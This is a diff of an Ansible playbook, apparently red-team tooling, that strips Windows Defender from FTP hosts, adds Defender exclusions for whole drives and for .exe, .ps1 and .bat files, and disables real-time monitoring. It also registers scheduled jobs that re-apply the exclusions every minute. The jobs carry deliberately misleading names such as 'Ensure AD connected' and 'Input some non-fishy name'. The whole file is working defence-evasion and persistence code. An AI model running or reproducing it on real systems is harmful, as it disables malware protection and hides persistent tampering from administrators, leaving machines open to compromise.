@@ -1,17 +1,43 @@
 -
+  name: Lockdown ftp special case
+  hosts: windowsftp
+  strategy: free
+  gather_facts: no
+  tasks:
+    - win_shell: Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI
+    - win_reboot:
+        shutdown_timeout: 3600
+        reboot_timeout: 3600
+
+-
   name: Disable Defender
   hosts: windows
   strategy: free
   gather_facts: no
   tasks:
-    - win_shell: Add-MpPreference -ExclusionPath "C:\temp"
-    - win_shell: Add-MpPreference -ExclusionPath "C:\"
-    - win_shell: Add-MpPreference -ExclusionPath "C:\Windows"
-    - win_shell: Add-MpPreference -ExclusionExtension ".exe"
-    - win_shell: Add-MpPreference -ExclusionExtension ".bat"
-    - win_shell: Register-ScheduledJob -Name 'WindowsLoader1' -ScriptBlock { Add-MpPreference -ExclusionPath "C:\temp" } -RunNow -RunEvery 00:01:00
-    - win_shell: Register-ScheduledJob -Name 'WindowsLoaderv22' -ScriptBlock { Add-MpPreference -ExclusionPath "C:\Windows" } -RunNow -RunEvery 00:01:00
-    - win_shell: Register-ScheduledJob -Name 'WindowsLoaderv33' -ScriptBlock { Add-MpPreference -ExclusionExtension ".exe" } -RunNow -RunEvery 00:01:00
-    - win_shell: Register-ScheduledJob -Name 'WindowsLoaderv44' -ScriptBlock { Add-MpPreference -ExclusionExtension ".bat" } -RunNow -RunEvery 00:01:00
-    - win_shell: Register-ScheduledJob -Name 'WindowsLoader1' -ScriptBlock { Add-MpPreference -ExclusionPath "C:\" } -RunNow -RunEvery 00:01:00
+    - win_shell: Add-MpPreference -ExclusionPath C:\temp
+      ignore_errors: yes
+    - win_shell: Add-MpPreference -ExclusionPath C:\
+      ignore_errors: yes
+    - win_shell: Add-MpPreference -ExclusionPath C:\Windows
+      ignore_errors: yes
+    - win_shell: Add-MpPreference -ExclusionExtension .exe
+      ignore_errors: yes
+    - win_shell: Add-MpPreference -ExclusionExtension .ps1
+      ignore_errors: yes
+    - win_shell: Add-MpPreference -ExclusionExtension .bat
+      ignore_errors: yes
+    - win_shell: Register-ScheduledJob -Name 'Ensure AD connected' -ScriptBlock { Add-MpPreference -ExclusionPath C:\temp } -RunNow -RunEvery 00:01:00
+      ignore_errors: yes
+    - win_shell: Register-ScheduledJob -Name 'systemd.init' -ScriptBlock { Add-MpPreference -ExclusionPath C:\Windows } -RunNow -RunEvery 00:01:00
+      ignore_errors: yes
+    - win_shell: Register-ScheduledJob -Name 'Input some non-fishy name' -ScriptBlock { Add-MpPreference -ExclusionExtension .exe } -RunNow -RunEvery 00:01:00
+      ignore_errors: yes
+    - win_shell: Register-ScheduledJob -Name 'Windows startup jobs' -ScriptBlock { Add-MpPreference -ExclusionExtension .bat } -RunNow -RunEvery 00:01:00
+      ignore_errors: yes
+    - win_shell: Register-ScheduledJob -Name 'Disable malware' -ScriptBlock { Add-MpPreference -ExclusionExtension .ps1 } -RunNow -RunEvery 00:01:00
+      ignore_errors: yes
+    - win_shell: Register-ScheduledJob -Name 'Delete Red Team' -ScriptBlock { Add-MpPreference -ExclusionPath C:\ } -RunNow -RunEvery 00:01:00
+      ignore_errors: yes
     - win_shell: Set-MpPreference -DisableRealtimeMonitoring $true
+      ignore_errors: yes
